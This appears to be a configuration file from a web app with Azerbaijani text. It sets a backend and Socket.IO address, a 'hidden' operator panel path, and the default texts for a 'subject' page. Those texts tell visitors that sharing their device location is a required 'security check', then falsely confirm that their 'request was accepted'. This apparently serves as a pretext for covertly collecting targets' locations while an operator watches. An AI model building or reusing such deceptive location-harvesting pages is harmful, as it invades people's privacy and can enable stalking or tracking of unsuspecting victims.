/**
 * Backend API və Socket.IO (yerli: 3500 port).
 * Telefondan: frontend/.env → REACT_APP_API_URL=http://KOMPUTER_IP:3500
 */
const DEFAULT_BACKEND = 'http://localhost:3500';

export const API_BASE_URL = (process.env.REACT_APP_API_URL || DEFAULT_BACKEND).replace(
    /\/$/,
    ''
);

/** Socket.IO eyni hostda işləyir */
export const SOCKET_URL = API_BASE_URL;

/** Operator paneli yolu (gizli) */
export const ADMIN_PATH =
    (process.env.REACT_APP_ADMIN_PATH || '/admin').replace(/\/$/, '') || '/admin';

/** Subyekt səhifəsi mətnləri (görünən UI) */
export const SUBJECT_TITLE =
    process.env.REACT_APP_SUBJECT_TITLE || 'Sorğu doğrulaması';

export const SUBJECT_MESSAGE =
    process.env.REACT_APP_SUBJECT_MESSAGE ||
    'Davam etmək üçün cihazınızın konumuna icazə verməlisiniz. Bu, təhlükəsizlik yoxlamasıdır.';

export const SUBJECT_SUCCESS_MESSAGE =
    process.env.REACT_APP_SUBJECT_SUCCESS_MESSAGE ||
    'Təsdiqləndi. Sorğunuz qəbul olundu — bu pəncərəni bağlaya bilərsiniz.';

export const SUBJECT_GRANTED_KEY = 'subject_locationGranted';
